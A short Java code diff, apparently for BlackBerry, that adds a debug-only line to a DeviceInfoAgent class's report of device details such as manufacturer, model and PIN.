@@ -93,6 +93,11 @@ public final class DeviceInfoAgent extends Agent {
         if (DeviceInfo.isSimulator()) {
             sb.append("Simulator\n");
         }
+        
+        //#ifdef DEBUG
+        sb.append("Debug\n");
+        //#endif
+        
         sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
         sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
         sb.append("Pin: " + Device.getPin() + "\n");
